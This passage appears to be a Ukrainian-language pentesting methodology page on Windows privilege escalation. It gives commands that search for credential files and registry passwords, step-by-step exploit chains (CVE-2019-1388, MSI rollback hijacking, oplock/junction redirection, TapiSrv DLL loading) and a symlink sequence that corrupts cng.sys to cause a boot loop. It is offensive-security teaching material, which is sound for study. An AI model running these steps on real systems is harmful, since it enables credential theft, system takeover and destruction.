Файл KeePass `.kdbx`, який можна прочитати, так само є лише зачіпкою на зашифроване сховище. Щоб розблокувати його, потрібен власне майстер-пароль, а також будь-який налаштований файл ключа чи фактори облікового запису. Якщо під час авторизованої перевірки в записі виявлено пару хешів LM:NT, перевірте вказаний обліковий запис і з’ясуйте, чи є хеш NT актуальним і чи приймає його служба NTLM цільової системи, перш ніж розглядати [pass-the-hash](../ntlm/README.md#pass-the-hash). Запис у сховищі сам по собі не надає прав Administrator або SYSTEM; також мають бути доступні віддалена служба, права облікового запису та окремий крок виконання через службу. В інвентаризації слід зазначати шлях до сховища та можливість його прочитати, а не виводити базу даних чи збережені облікові дані.

Знайдіть усі запропоновані файли:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Облікові дані в Кошику

Перевірте доступні записи Кошика на наявність видалених резервних копій і архівів конфігурацій, а також файлів, у назвах яких прямо згадуються облікові дані. Корисна резервна копія `.7z`, `.zip` або `.rar` може бути створена кілька місяців тому й мати звичайну назву. Windows зберігає початковий шлях і час видалення в записі `$I`, а видалений файл — у відповідному записі `$R`; перш ніж відкривати архів, перевірте метадані та наявність у поточного облікового запису прав на читання. Видимість залежить від тому, SID користувача та дозволів на файли, тому порожній список не доводить, що відновлюваної резервної копії немає. Розглядайте назву архіву лише як підставу для перевірки, а не як доказ того, що він містить дійсний секрет.

Доступний видалений файл `.pfx` також може бути підказкою щодо **code-signing**. Якщо він містить доступний приватний ключ, ним можна підписати змінений скрипт PowerShell; [для PowerShell потрібен сертифікат code-signing із приватним ключем](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), а [правила видавця AppLocker перевіряють особу підписувача та область дії правила](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Для виконання від імені іншого облікового запису поточний обліковий запис має мати змогу змінити саме цей скрипт, ефективне правило має приймати отриманий підпис для цього скрипту й цільового облікового запису, а заплановане завдання чи інший компонент із вищими привілеями має фактично запускати його. Сама назва файлу `.pfx`, тема сертифіката чи можливість змінити скрипт не підтверджують наявність такого ланцюжка. Перш ніж відкривати матеріали приватного ключа або запускати завдання, перевірте метадані, ACL, політику та команду, яку виконує завдання.

Також перевірте доступні бази даних профілів клієнтів обміну повідомленнями, нотатки та отримані файли на наявність підказок щодо облікових даних. Експорт ключа відновлення BitLocker може зберігатися у форматі HTML або TXT, іноді всередині архіву з відповідною назвою. Такі матеріали можуть надати доступ до окремого зашифрованого тому з даними, що містить старіші резервні копії; перевіряйте том і архів лише за наявності дозволу на доступ. Якщо резервна копія містить `NTDS.dit`, для відновлення облікових даних домену офлайн також потрібен відповідний вулик `SYSTEM`, як описано в [процесі роботи з резервними копіями та привілейованими групами](../active-directory-methodology/privileged-groups-and-token-privileges.md). Самі назви файлів і заблокований том не доводять, що існує придатний ключ відновлення чи резервна копія домену.

Щоб **відновити паролі**, збережені кількома програмами, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### У реєстрі

**Інші можливі ключі реєстру з обліковими даними**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Витягування ключів openssh із реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Перевірте бази даних, де зберігаються паролі з **Chrome, Edge або Firefox**.\
Також перевірте історію, закладки та вибране в браузерах: можливо, там зберігаються **паролі**.

Для стандартного профілю Edge **Default** поточного користувача файл `Login Data` розташований у `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, а `Local State` — у батьківському каталозі `User Data`. [Microsoft документує розташування стандартного профілю](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); інший профіль або політика `UserDataDir` можуть змінити його. Наявність файлів — лише підказка щодо сховища облікових даних: перевірте, чи доступні файли для читання, чи маєте контекст DPAPI відповідного користувача або інший дозволений матеріал ключа, а також чи належить збережений логін обліковому запису з вищими привілеями. Перелік лише шляхів не вимагає відкривати базу даних або виводити розшифровані паролі.

Для Firefox [Mozilla документує](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), що `key4.db` і `logins.json` у профілі — це парні файли ключа та зашифрованих логінів. Їхня наявність — лише підказка: перевірте, чи обидва файли доступні для читання, чи є збережені записи та чи захищений ключ Primary Password, перш ніж робити висновок, що облікові дані можна використати. Якщо відновлені облікові дані належать доменному обліковому запису, окремо перевірте ефективні права цього облікового запису на керування групами та [права групи на читання або розшифрування пароля LAPS](../active-directory-methodology/laps.md); самі артефакти браузера не доводять наявність шляху до прав адміністратора.

Інструменти для вилучення паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Перезапис COM DLL**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а його функціональність надається через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсу (IID).

Класи та інтерфейси COM визначені в реєстрі відповідно в розділах **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей реєстр створюється шляхом об’єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

У CLSID цього реєстру можна знайти дочірній розділ реєстру **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення **ThreadingModel**, яке може мати значення **Apartment** (однопотокова модель), **Free** (багатопотокова модель), **Both** (одно- або багатопотокова модель) чи **Neutral** (нейтральна до потоків модель).

![Історія браузерів — перезапис COM DLL: у CLSID цього реєстру можна знайти дочірній розділ реєстру InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)

Загалом, якщо ви можете **перезаписати будь-яку з DLL**, які виконуватимуться, то зможете **підвищити привілеї**, якщо цю DLL виконуватиме інший користувач.

Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм закріплення, перегляньте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Пошук паролів у файлах і реєстрі**

**Пошук у вмісті файлів**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Пошук файлу за певною назвою**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Шукайте в реєстрі назви ключів і паролі**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**. Я створив цей плагін, щоб **автоматично запускати кожен POST-модуль metasploit, який шукає облікові дані** на комп’ютері жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять паролі, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для отримання паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сеанси**, **імена користувачів** і **паролі** для різних інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY та RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Уявіть, що **процес, запущений від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) із **повним доступом**. Той самий процес **також створює новий процес** (`CreateProcess()`) **із низькими привілеями, але з успадкуванням усіх відкритих дескрипторів головного процесу**.\
Тоді, якщо ви маєте **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор створеного привілейованого процесу**, отриманий через `OpenProcess()`, і **ін’єктувати shellcode**.\
[Прочитайте цей приклад, щоб дізнатися більше про **виявлення та експлуатацію цієї вразливості**.](leaked-handle-exploitation.md)\
[Прочитайте [**цю іншу публікацію**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/), де докладніше пояснено, як перевіряти й використовувати інші відкриті дескриптори процесів і потоків, успадковані з різними рівнями дозволів (не лише з повним доступом).]

## Named Pipe Client Impersonation

Сегменти спільної пам’яті, які називають **каналами (pipes)**, забезпечують взаємодію процесів і передавання даних.

Windows має функцію під назвою **Named Pipes**, яка дає змогу процесам безпосередньо обмінюватися даними, зокрема через різні мережі. Це схоже на архітектуру клієнт/сервер, де ролі називаються **сервером іменованого каналу** та **клієнтом іменованого каналу**.

Коли **клієнт** надсилає дані через канал, **сервер**, який налаштував канал, може **перейняти особу** **клієнта**, якщо має необхідні права **SeImpersonate**. Виявивши **привілейований процес**, який взаємодіє через канал, який ви можете імітувати, можна **отримати вищі привілеї**, перейнявши особу цього процесу, коли він взаємодіятиме зі створеним вами каналом. Інструкції з виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений нижче інструмент дає змогу **перехоплювати трафік іменованого каналу за допомогою інструмента на кшталт Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **а цей інструмент дає змогу переглядати всі канали, щоб знаходити privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Віддалений DWORD write через Telephony tapsrv до RCE

Служба Telephony (TapiSrv) у режимі сервера надає `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може використати асинхронний шлях подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **запис 4 байтів** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, а потім отримати права адміністратора Telephony і завантажити довільну DLL як службу. Повний процес:

- Викликати `ClientAttach`, задавши для `pszDomainUser` наявний шлях, доступний для запису → служба відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для запису асинхронних подій.
- Кожна подія записує контрольований зловмисником `InitContext` із `Initialize` у цей дескриптор. Зареєструвати line app через `LRegisterRequestRecipient` (`Req_Func 61`), запустити `TRequestMakeCall` (`Req_Func 121`), отримати дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасувати реєстрацію/завершити роботу, щоб повторювати детерміновані записи.
- Додати себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, повторно підключитися, а потім викликати `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть запускати код у Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання обробниками протоколів / ShellExecute через засоби відображення Markdown

Клікабельні Markdown-посилання, передані до `ShellExecuteExW`, можуть запускати небезпечні URI-обробники (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) і виконувати контрольовані зловмисником файли від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Коли ви отримуєте shell від імені користувача, можуть виконуватися заплановані завдання або інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди збирає командні рядки процесів, порівнює поточний стан із попереднім і виводить відмінності.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Викрадення паролів із процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / обхід UAC

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM", перебуваючи під непривілейованим користувачем.

Це дає змогу одночасно підвищити привілеї та обійти UAC за допомогою тієї самої вразливості. Крім того, нічого не потрібно встановлювати, а бінарний файл, який використовується під час процесу, підписаний і виданий Microsoft.

Ось деякі вразливі системи:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Щоб експлуатувати цю вразливість, потрібно виконати такі кроки:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

У вас є всі необхідні файли та відомості в цьому репозиторії GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Від Administrator Medium до High Integrity Level / UAC Bypass

Прочитайте це, щоб **дізнатися про рівні цілісності**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC і UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Перенаправлення каталогів завантаження в кореневий каталог вебсервера

Застосунок може створити передбачуваний підкаталог для завантажень, записати в нього ім’я файлу, указане користувачем, а потім обробити цей файл. Якщо користувач із низькими привілеями може видалити цей підкаталог і замінити його junction NTFS до запису з боку сервера, запис може пройти через junction до каталогу, доступного через вебсервер. Розміщений там скрипт може виконуватися з правами облікового запису вебслужби, якщо сервер запускає файли такого типу. Це специфічна для застосунку межа довільного запису; наявність каталогу для завантажень із правами запису або вже створеного junction сама по собі нічого не доводить.

Перевірте точну побудову шляху й час виконання в обробнику завантажень, ефективні права користувача на видалення та створення підкаталогу, ефективні ACL каталогу призначення, чи проходить записувач через точки повторного аналізу, а також чи виконує вебсервер файли в цьому каталозі. Окремо підтвердьте ідентичності процесів записувача та вебсервера. Пасивна інвентаризація може показати ACL каталогів і метадані reparse point, але не може визначити поведінку обробника або майбутню підміну junction. Якщо виконання відбувається від імені облікового запису служби, перевірте **фактичний токен процесу**, перш ніж розглядати окремий шлях через привілеї токена.

## Від довільного видалення/переміщення/перейменування папок до SYSTEM EoP

Техніка описана [**в цій публікації блогу**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), а експлойт-код [**доступний тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

По суті, атака зловживає функцією відкату Windows Installer, щоб під час видалення замінити легітимні файли шкідливими. Для цього зловмиснику потрібно створити **шкідливий MSI installer**, який використають для захоплення папки `C:\Config.Msi`. Пізніше Windows Installer використає її для зберігання файлів відкату під час видалення інших пакетів MSI; файли відкату буде змінено так, щоб вони містили шкідливе навантаження.

Коротко техніка працює так:

1. **Етап 1 — Підготовка до захоплення (залишити `C:\Config.Msi` порожньою)**

- Крок 1: Установіть MSI
    - Створіть `.msi`, який установлює нешкідливий файл (наприклад, `dummy.txt`) у папку з правами запису (`TARGETDIR`).
    - Позначте installer як **"UAC Compliant"**, щоб його міг запустити **користувач без прав адміністратора**.
    - Після встановлення залиште відкритим **handle** до файлу.

- Крок 2: Почніть видалення
    - Видаліть той самий `.msi`.
    - У процесі видалення файли починають переміщатися до `C:\Config.Msi` і перейменовуватися на файли `.rbf` (резервні копії для відкату).
    - **Опитуйте відкритий file handle** за допомогою `GetFinalPathNameByHandle`, щоб виявити момент, коли файл стає `C:\Config.Msi\<random>.rbf`.

- Крок 3: Власна синхронізація
    - `.msi` містить **власну дію видалення (`SyncOnRbfWritten`)**, яка:
        - Сигналізує, що файл `.rbf` записано.
        - Потім **чекає** на іншу подію, перш ніж продовжити видалення.

- Крок 4: Заблокуйте видалення `.rbf`
    - Після сигналу **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **не дасть його видалити**.
    - Потім подайте сигнал, щоб видалення могло завершитися.
    - Windows Installer не зможе видалити `.rbf`, а оскільки йому не вдасться видалити весь вміст, **`C:\Config.Msi` не буде видалено**.

- Крок 5: Видаліть `.rbf` вручну
    - Ви (зловмисник) вручну видаляєте файл `.rbf`.
    - Тепер **`C:\Config.Msi` порожня** і готова до захоплення.

> На цьому етапі **скористайтеся вразливістю довільного видалення папок на рівні SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 — Заміна скриптів відкату шкідливими**

- Крок 6: Створіть `C:\Config.Msi` з ненадійними ACL
    - Самостійно створіть папку `C:\Config.Msi`.
    - Установіть **слабкі DACL** (наприклад, Everyone:F) і **залиште відкритим handle** із правом `WRITE_DAC`.

- Крок 7: Запустіть інше встановлення
    - Знову встановіть `.msi`, указавши:
        - `TARGETDIR`: розташування з правами запису.
        - `ERROROUT`: змінну, яка спричинить примусову помилку.
    - Це встановлення використають, щоб знову запустити **відкат**, який читає `.rbs` і `.rbf`.

- Крок 8: Стежте за появою `.rbs`
    - Використовуйте `ReadDirectoryChangesW`, щоб стежити за `C:\Config.Msi`, доки не з’явиться новий `.rbs`.
    - Збережіть його ім’я.

- Крок 9: Синхронізуйтеся перед відкатом
    - `.msi` містить **власну дію встановлення (`SyncBeforeRollback`)**, яка:
        - Подає сигнал про створення `.rbs`.
        - Потім **чекає**, перш ніж продовжити.

- Крок 10: Повторно застосуйте слабкі ACL
    - Після отримання події ` .rbs created`:
        - Windows Installer **повторно застосовує надійні ACL** до `C:\Config.Msi`.
        - Але оскільки у вас досі є handle із правом `WRITE_DAC`, ви можете **знову застосувати слабкі ACL**.

> ACL **перевіряються лише під час відкриття handle**, тож ви все ще можете записувати в папку.

- Крок 11: Розмістіть підроблені `.rbs` і `.rbf`
    - Перезапишіть файл `.rbs` **підробленим скриптом відкату**, який наказує Windows:
        - Відновити ваш файл `.rbf` (шкідливу DLL) у **привілейоване розташування** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Розмістіть підроблений `.rbf` зі **шкідливою DLL-навантаженням рівня SYSTEM**.

- Крок 12: Запустіть відкат
    - Подайте сигнал синхронізації, щоб installer продовжив роботу.
    - Дія користувача типу 19 (`ErrorOut`) налаштована так, щоб **навмисно завершити встановлення помилкою** у визначений момент.
    - Це запускає **відкат**.

- Крок 13: SYSTEM установлює вашу DLL
    - Windows Installer:
        - Читає ваш шкідливий `.rbs`.
        - Копіює вашу DLL із `.rbf` до цільового розташування.
    - Тепер у вас є **шкідлива DLL у шляху, з якого її завантажує SYSTEM**.

- Фінальний крок: Виконайте код із правами SYSTEM
    - Запустіть довірений **автоматично підвищений бінарний файл** (наприклад, `osk.exe`), який завантажує захоплену вами DLL.
    - **Готово**: ваш код виконується **як SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлів до SYSTEM EoP

Основний метод із відкатом MSI (описаний вище) передбачає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша вразливість дозволяє лише **довільне видалення файлів**?

Можна скористатися **внутрішніми механізмами NTFS**: у кожної папки є прихований альтернативний потік даних із назвою:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Цей потік зберігає **метадані індексу** папки.

Тож якщо **видалити потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить папку повністю** з файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Навіть якщо ви викликаєте API видалення *файлу*, воно **видаляє саму папку**.

### Від видалення вмісту папки до підвищення привілеїв до SYSTEM
Що, якщо ваш примітив не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої атакувальником**?

1. Крок 1: Створіть папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- **Oplock призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **спрацьовує oplock** і передає керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
    - Це очистить `folder1`, не порушуючи oplock.
    - Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Варіант C: Створіть **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Це націлено на внутрішній потік NTFS, у якому зберігаються метадані папки, — його видалення видаляє папку.

5. Крок 5: Звільнення oplock
- Процес SYSTEM продовжує роботу й намагається видалити `file1.txt`.
- Але тепер через junction + symlink він фактично видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Результат**: `C:\Config.Msi` видаляється користувачем SYSTEM.

### Від створення папки в довільному місці до постійного DoS

Використайте примітив, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з назвою **критично важливого драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```

- Цей шлях зазвичай відповідає драйверу режиму ядра `cng.sys`.
- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити справжній драйвер під час завантаження.
- Після цього Windows спробує завантажити `cng.sys` під час завантаження.
- Вона побачить папку, **не зможе знайти справжній драйвер** і **зазнає збою або зупинить завантаження**.
- **Резервного варіанта немає**, і **відновитися без зовнішнього втручання** (наприклад, відновлення завантаження або доступу до диска) не вдасться.

### Від привілейованих шляхів для журналів/резервних копій і OM symlinks до довільного перезапису файлів / DoS під час завантаження

Якщо **привілейована служба** записує журнали/експорти за шляхом, прочитаним із **конфігурації, доступної для запису**, перенаправте цей шлях за допомогою **Object Manager symlinks + точок монтування NTFS**, щоб перетворити привілейований запис на довільний перезапис (навіть **без** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Вимоги**
- Конфігурація, у якій зберігається цільовий шлях, доступна зловмиснику для запису (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити точку монтування для `\RPC Control` і OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Привілейована операція, яка записує за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігурацію, щоб дізнатися привілейований шлях до журналу, наприклад, `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише журнал (наприклад, адміністратор запускає «надіслати тестове SMS»). Тепер запис потрапляє до `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписаний цільовий файл (hex/PE parser), щоб підтвердити пошкодження; перезавантаження змушує Windows завантажити підмінений шлях драйвера → **boot loop DoS**. Це також застосовно до будь-якого захищеного файла, який привілейована служба відкриває для запису.

> Зазвичай `cng.sys` завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія є в `C:\Windows\System32\cng.sys`, система може спочатку спробувати завантажити її, що робить цей файл надійною ціллю для DoS через пошкоджені дані.



## **Від High Integrity до System**

### **Нова служба**

Якщо ви вже працюєте в процесі з рівнем High Integrity, **шлях до SYSTEM** може бути простим: достатньо **створити й запустити нову службу**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Створюючи бінарний файл служби, переконайтеся, що це дійсна служба або що бінарний файл швидко виконує необхідні дії, оскільки його буде завершено через 20 секунд, якщо це не дійсна служба.

### AlwaysInstallElevated

З процесу з високим рівнем цілісності можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** і **встановити** reverse shell за допомогою обгортки _**.msi**_.\
[Докладніше про задіяні ключі реєстру та встановлення пакета _.msi_ можна дізнатися тут.](#alwaysinstallelevated)

### Від високого рівня цілісності з привілеєм SeImpersonate до System

**Код можна** [**знайти тут**](seimpersonate-from-high-to-system.md)**.**

### Від SeDebug + SeImpersonate до привілеїв повного Token

Якщо у вас є ці привілеї Token (імовірно, ви знайдете їх у процесі з високим рівнем цілісності), ви зможете **відкрити майже будь-який процес** (окрім захищених процесів) за допомогою привілею SeDebug, **скопіювати Token** процесу та створити **довільний процес із цим Token**.\
Зазвичай ця техніка полягає у **виборі будь-якого процесу, що працює від імені SYSTEM і має всі привілеї Token** (_так, можна знайти процеси SYSTEM без усіх привілеїв Token_).\
**Приклад коду, що виконує запропоновану техніку, можна** [**знайти тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку meterpreter використовує для підвищення привілеїв у `getsystem`. Вона полягає в тому, щоб **створити pipe, а потім створити службу або зловживати нею, щоб записати дані в цей pipe**. Після цього **сервер**, який створив pipe із привілеєм **`SeImpersonate`**, зможе **імперсонувати Token** клієнта pipe (служби) й отримати привілеї SYSTEM.\
Щоб [**дізнатися більше про іменовані канали, прочитайте це**](#named-pipe-client-impersonation).\
Приклад того, [**як перейти від високого рівня цілісності до System за допомогою іменованих каналів, наведено тут**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **перехопити DLL**, яку **завантажує** **процес**, що працює від імені **SYSTEM**, ви зможете виконати довільний код із цими дозволами. Отже, Dll Hijacking також корисний для такого типу підвищення привілеїв. Крім того, його **набагато легше виконати з процесу з високим рівнем цілісності**, оскільки він матиме **дозволи на запис** у папки, що використовуються для завантаження DLL.\
**Докладніше про Dll hijacking можна** [**дізнатися тут**](dll-hijacking/index.html)**.**

### **Від Administrator або Network Service до System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Від LOCAL SERVICE або NETWORK SERVICE до повних привілеїв

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Додаткова допомога

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Корисні інструменти

**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
